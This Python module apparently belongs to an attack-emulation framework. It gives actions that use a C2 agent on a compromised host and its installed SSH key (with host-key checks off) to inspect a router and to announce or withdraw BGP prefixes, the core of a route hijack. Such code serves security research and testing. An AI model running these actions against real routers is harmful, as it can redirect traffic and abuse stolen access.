"""High-level BGP operations through a compromised host's restricted router access.

The actions deliberately do not expose a general router shell. They require a
`Host` with a C2 agent (the compromised intermediate), use the edge key that is
already installed on that host, and go through the existing forced wrapper.
The event reports the attacker router's local command/view; remote route
acceptance and traffic redirection are separate observations.
"""

from __future__ import annotations

import ipaddress
import re
import shlex

from incalmo.core.actions.high_level_action import HighLevelAction
from incalmo.core.actions.low_level_action import RESOLVE_HOME
from incalmo.core.actions.LowLevel import RunBashCommand
from incalmo.core.models.events import BashOutputEvent, BGPRouterEvent, Event
from incalmo.core.models.network import Host
from incalmo.core.services import (
    AttackGraphService,
    EnvironmentStateService,
    LowLevelActionOrchestrator,
)
from incalmo.core.services.action_context import HighLevelContext
from incalmo.models.agent import Agent

_ASPECT_COMMANDS = {
    "bgp": "show ip bgp",
    "summary": "show ip bgp summary",
    "route": "show ip route",
    "config": "show running-config",
    "neighbors": "show ip bgp neighbors",
}
_SSH_EXIT_MARKER = "__MHB_BGP_EXIT__"


def _ipv4(value, label: str) -> str:
    try:
        return str(ipaddress.IPv4Address(str(value)))
    except (ipaddress.AddressValueError, ValueError) as exc:
        raise ValueError(f"{label} must be an IPv4 address; got {value!r}") from exc


def _prefix(value) -> str:
    try:
        return str(ipaddress.IPv4Network(str(value)))
    except ValueError as exc:
        raise ValueError(f"prefix must be an exact IPv4 network; got {value!r}") from exc


def _has_bgp_route(output: str, prefix: str) -> bool:
    """The FRR prefix query prints this header only when a route exists."""
    return f"BGP routing table entry for {prefix}" in output


def _has_route(output: str, prefix: str) -> bool:
    """The FRR route query prints this header only when a RIB entry exists."""
    return f"Routing entry for {prefix}" in output


def _asn(value) -> int:
    if isinstance(value, bool) or not re.fullmatch(r"[0-9]+", str(value)):
        raise ValueError(f"asn must be a positive integer; got {value!r}")
    asn = int(value)
    if not 1 <= asn <= 0xFFFFFFFF:
        raise ValueError(f"asn must be between 1 and 4294967295; got {value!r}")
    return asn


def _router_address(router, host: Host) -> str:
    if isinstance(router, Host):
        def ipv4_addresses(value: Host) -> list[ipaddress.IPv4Address]:
            addresses = []
            for item in value.ip_addresses:
                try:
                    address = ipaddress.ip_address(str(item))
                except ValueError:
                    continue
                if address.version == 4:
                    addresses.append(address)
            return addresses

        addresses = ipv4_addresses(router)
        if not addresses:
            raise ValueError("router Host has no usable IPv4 address")
        if len(addresses) == 1:
            return str(addresses[0])
        host_addresses = ipv4_addresses(host)
        candidates = {
            address
            for address in addresses
            if any(
                address in ipaddress.ip_network(f"{host_address}/24", strict=False)
                for host_address in host_addresses
            )
        }
        if len(candidates) == 1:
            return str(candidates.pop())
        raise ValueError(
            "router Host has multiple candidate addresses; pass the explicit control address"
        )
    return _ipv4(router, "router")


def _prefix_config(output: str, prefix: str, asn: int) -> tuple[bool, set[str]]:
    """Find the local network statement and exact-prefix static configuration."""
    routes = set()
    announced = in_router = False
    for line in output.splitlines():
        if line.startswith("ip route " + prefix + " "):
            routes.add(line)
        if line.startswith("router bgp "):
            in_router = line == f"router bgp {asn}"
        elif line and not line.startswith(" "):
            in_router = False
        if in_router and line.strip() == f"network {prefix}":
            announced = True
    return announced, routes


def _ssh_command(router: str, remote: str) -> str:
    """Build the one-argument remote wrapper command, executed on the agent host.

    The key expression is intentionally the agent user's resolved home; it is
    expanded by the agent host's shell, not by this process. All other values
    are validated or quoted so they cannot become shell syntax.
    """
    key = f'"{RESOLVE_HOME}/.ssh/id_ed25519"'
    return (
        "ssh -T -o BatchMode=yes -o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 "
        f"-o IdentitiesOnly=yes -o LogLevel=ERROR -i {key} "
        f"root@{router} {shlex.quote(remote)}; "
        f"__mhb_rc=$?; printf '\\n{_SSH_EXIT_MARKER}:%s\\n' \"$__mhb_rc\""
    )


class _BGPRouterAction(HighLevelAction):
    def __init__(self, host: Host, router):
        super().__init__()
        if not isinstance(host, Host):
            raise ValueError(
                "host must be the compromised Host with the restricted router key"
            )
        self.host = host
        self.router = _router_address(router, self.host)

    def _agent(self) -> Agent:
        agent = self.host.get_agent()
        if agent is None:
            raise RuntimeError(
                "BGP action requires a C2 agent on the compromised host "
                f"{self.host.hostname or self.host.ip_addresses}; the host is not compromised"
            )
        if not self.host.has_agent(agent):
            raise RuntimeError("selected agent does not belong to the supplied host")
        return agent

    async def _run(
        self,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        agent: Agent,
        remote: str,
        context: HighLevelContext,
    ) -> tuple[str, int | None]:
        command = _ssh_command(self.router, remote)
        events = await low_level_action_orchestrator.run_action(
            RunBashCommand(agent, command), context
        )
        output = "\n".join(
            event.bash_output for event in events if isinstance(event, BashOutputEvent)
        )
        match = re.search(rf"{re.escape(_SSH_EXIT_MARKER)}:(\d+)", output)
        rc = int(match.group(1)) if match else None
        cleaned = re.sub(
            rf"\n?{re.escape(_SSH_EXIT_MARKER)}:\d+\n?", "\n", output
        ).strip()
        return (cleaned or "(no output)"), rc

    def _record(self, attack_graph_service: AttackGraphService, operation: str) -> None:
        attack_graph_service.record_action(self.host, self.host, operation)


class BGPRouterInspect(_BGPRouterAction):
    """Read one local routing/running state view from the attacker router."""

    def __init__(self, host: Host, router, aspect: str = "bgp"):
        super().__init__(host, router)
        if aspect not in _ASPECT_COMMANDS:
            raise ValueError(
                f"aspect must be one of {sorted(_ASPECT_COMMANDS)}; got {aspect!r}"
            )
        self.aspect = aspect

    async def run(
        self,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        environment_state_service: EnvironmentStateService,
        attack_graph_service: AttackGraphService,
        context: HighLevelContext,
    ) -> list[Event]:
        agent = self._agent()
        self._record(attack_graph_service, f"bgp_inspect_{self.aspect}")
        output, rc = await self._run(
            low_level_action_orchestrator, agent, _ASPECT_COMMANDS[self.aspect], context
        )
        return [
            BGPRouterEvent(
                self.host,
                agent,
                self.router,
                "inspect",
                output,
                aspect=self.aspect,
                local_command_ok=rc == 0,
            )
        ]


class BGPRouterObserve(_BGPRouterAction):
    """Read the attacker router's local BGP view for one prefix."""

    def __init__(self, host: Host, router, prefix):
        super().__init__(host, router)
        self.prefix = _prefix(prefix)

    async def run(
        self,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        environment_state_service: EnvironmentStateService,
        attack_graph_service: AttackGraphService,
        context: HighLevelContext,
    ) -> list[Event]:
        agent = self._agent()
        self._record(attack_graph_service, "bgp_observe")
        output, rc = await self._run(
            low_level_action_orchestrator, agent, f"show ip bgp {self.prefix}", context
        )
        return [
            BGPRouterEvent(
                self.host,
                agent,
                self.router,
                "observe",
                output,
                prefix=self.prefix,
                local_command_ok=rc == 0,
            )
        ]


class BGPRouterAnnounce(_BGPRouterAction):
    """Install the static route and BGP network statement for one prefix.

    These are two deliberate local effects. The action refuses to overwrite an
    existing exact static route or BGP announcement; the event's `installed`
    reflects the post-change local BGP and route views, not remote acceptance.
    """

    def __init__(self, host: Host, router, asn, prefix, next_hop):
        super().__init__(host, router)
        self.asn = _asn(asn)
        self.prefix = _prefix(prefix)
        self.next_hop = _ipv4(next_hop, "next_hop")

    async def run(
        self,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        environment_state_service: EnvironmentStateService,
        attack_graph_service: AttackGraphService,
        context: HighLevelContext,
    ) -> list[Event]:
        agent = self._agent()
        bgp_state, bgp_rc = await self._run(
            low_level_action_orchestrator, agent, f"show ip bgp {self.prefix}", context
        )
        route_state, route_rc = await self._run(
            low_level_action_orchestrator,
            agent,
            f"show ip route {self.prefix}",
            context,
        )
        config, config_rc = await self._run(
            low_level_action_orchestrator, agent, "show running-config", context
        )
        if bgp_rc != 0 or route_rc != 0 or config_rc != 0:
            raise RuntimeError(
                f"BGP pre-state read failed on {self.router}: "
                f"bgp_rc={bgp_rc}, route_rc={route_rc}, config_rc={config_rc}"
            )
        if f"router bgp {self.asn}" not in config.splitlines():
            raise RuntimeError(f"router has no configured BGP instance for AS {self.asn}")
        announced, static_routes = _prefix_config(config, self.prefix, self.asn)
        pre_existing = {
            "bgp": announced or _has_bgp_route(bgp_state, self.prefix),
            "static": bool(static_routes) or _has_route(route_state, self.prefix),
        }
        if pre_existing["bgp"] or pre_existing["static"]:
            self._record(attack_graph_service, "bgp_announce_refused_preexisting")
            return [
                BGPRouterEvent(
                    self.host,
                    agent,
                    self.router,
                    "announce",
                    "refusing to overwrite an existing exact prefix/route; no change\n"
                    f"show ip bgp {self.prefix}:\n{bgp_state}\n"
                    f"show ip route {self.prefix}:\n{route_state}",
                    asn=self.asn,
                    prefix=self.prefix,
                    next_hop=self.next_hop,
                    local_command_ok=None,
                    pre_existing=pre_existing,
                    installed=False,
                )
            ]

        remote = (
            f"configure terminal; ip route {self.prefix} {self.next_hop}; "
            f"router bgp {self.asn}; address-family ipv4 unicast; "
            f"network {self.prefix}; end"
        )
        apply_output, apply_rc = await self._run(
            low_level_action_orchestrator, agent, remote, context
        )
        post_bgp, post_bgp_rc = await self._run(
            low_level_action_orchestrator, agent, f"show ip bgp {self.prefix}", context
        )
        post_route, post_route_rc = await self._run(
            low_level_action_orchestrator,
            agent,
            f"show ip route {self.prefix}",
            context,
        )
        installed = (
            apply_rc == 0
            and post_bgp_rc == 0
            and post_route_rc == 0
            and _has_bgp_route(post_bgp, self.prefix)
            and _has_route(post_route, self.prefix)
        )
        self._record(attack_graph_service, "bgp_announce")
        return [
            BGPRouterEvent(
                self.host,
                agent,
                self.router,
                "announce",
                f"apply:\n{apply_output}\n"
                f"post-change show ip bgp {self.prefix}:\n{post_bgp}\n"
                f"post-change show ip route {self.prefix}:\n{post_route}",
                asn=self.asn,
                prefix=self.prefix,
                next_hop=self.next_hop,
                local_command_ok=apply_rc == 0,
                pre_existing=pre_existing,
                installed=installed,
            )
        ]


class BGPRouterWithdraw(_BGPRouterAction):
    """Remove only the exact static route and BGP network statement for a prefix."""

    def __init__(self, host: Host, router, asn, prefix, next_hop):
        super().__init__(host, router)
        self.asn = _asn(asn)
        self.prefix = _prefix(prefix)
        self.next_hop = _ipv4(next_hop, "next_hop")

    async def run(
        self,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        environment_state_service: EnvironmentStateService,
        attack_graph_service: AttackGraphService,
        context: HighLevelContext,
    ) -> list[Event]:
        agent = self._agent()
        bgp_state, bgp_rc = await self._run(
            low_level_action_orchestrator, agent, f"show ip bgp {self.prefix}", context
        )
        route_state, route_rc = await self._run(
            low_level_action_orchestrator,
            agent,
            f"show ip route {self.prefix}",
            context,
        )
        config, config_rc = await self._run(
            low_level_action_orchestrator, agent, "show running-config", context
        )
        if bgp_rc != 0 or route_rc != 0 or config_rc != 0:
            raise RuntimeError(
                f"BGP pre-state read failed on {self.router}: "
                f"bgp_rc={bgp_rc}, route_rc={route_rc}, config_rc={config_rc}"
            )
        if f"router bgp {self.asn}" not in config.splitlines():
            raise RuntimeError(f"router has no configured BGP instance for AS {self.asn}")
        announced, static_routes = _prefix_config(config, self.prefix, self.asn)
        pre_existing = {
            "bgp": announced or _has_bgp_route(bgp_state, self.prefix),
            "static": bool(static_routes) or _has_route(route_state, self.prefix),
        }
        if not (pre_existing["bgp"] or pre_existing["static"]):
            self._record(attack_graph_service, "bgp_withdraw_noop")
            return [
                BGPRouterEvent(
                    self.host,
                    agent,
                    self.router,
                    "withdraw",
                    "no exact prefix/route present; no change",
                    asn=self.asn,
                    prefix=self.prefix,
                    next_hop=self.next_hop,
                    local_command_ok=None,
                    pre_existing=pre_existing,
                    removed=False,
                )
            ]

        if static_routes != {f"ip route {self.prefix} {self.next_hop}"}:
            self._record(attack_graph_service, "bgp_withdraw_refused_mismatch")
            return [
                BGPRouterEvent(
                    self.host, agent, self.router, "withdraw",
                    "refusing withdrawal: the exact static prefix/next-hop does not match; no change",
                    asn=self.asn, prefix=self.prefix, next_hop=self.next_hop,
                    pre_existing=pre_existing, removed=False,
                )
            ]

        remote = (
            f"configure terminal; no ip route {self.prefix} {self.next_hop}; "
            f"router bgp {self.asn}; address-family ipv4 unicast; "
            f"no network {self.prefix}; end"
        )
        apply_output, apply_rc = await self._run(
            low_level_action_orchestrator, agent, remote, context
        )
        post_bgp, post_bgp_rc = await self._run(
            low_level_action_orchestrator, agent, f"show ip bgp {self.prefix}", context
        )
        post_route, post_route_rc = await self._run(
            low_level_action_orchestrator,
            agent,
            f"show ip route {self.prefix}",
            context,
        )
        removed = (
            apply_rc == 0
            and post_bgp_rc == 0
            and post_route_rc == 0
            and not _has_bgp_route(post_bgp, self.prefix)
            and not _has_route(post_route, self.prefix)
        )
        self._record(attack_graph_service, "bgp_withdraw")
        return [
            BGPRouterEvent(
                self.host,
                agent,
                self.router,
                "withdraw",
                f"apply:\n{apply_output}\n"
                f"post-change show ip bgp {self.prefix}:\n{post_bgp}\n"
                f"post-change show ip route {self.prefix}:\n{post_route}",
                asn=self.asn,
                prefix=self.prefix,
                next_hop=self.next_hop,
                local_command_ok=apply_rc == 0,
                pre_existing=pre_existing,
                removed=removed,
            )
        ]
